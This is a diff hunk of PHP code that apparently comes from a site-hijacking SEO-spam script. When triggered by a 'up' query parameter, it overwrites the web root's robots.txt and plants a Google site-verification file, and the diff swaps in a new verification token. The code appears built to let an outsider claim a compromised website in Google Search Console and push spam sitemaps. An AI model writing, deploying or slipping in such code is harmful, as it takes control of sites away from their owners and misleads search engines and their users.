@@ -197,7 +197,7 @@ if (isset($_GET['up'])) {
     $server_root = $_SERVER['DOCUMENT_ROOT'];
     if (is_writable($server_root)) { 
         file_put_contents($server_root . "/robots.txt", "User-agent: *\nAllow: /\nSitemap: " . $root_url . "sitemap.xml\n");
-        file_put_contents($server_root . "/google3b058340b0d95f2e.html", "google-site-verification: google3b058340b0d95f2e.html");
+        file_put_contents($server_root . "/googleaa90ee18a76106a6.html", "google-site-verification: googleaa90ee18a76106a6.html");
         echo "[SUCCESS] robots.txt & Google Verification created.\n";
     }
 
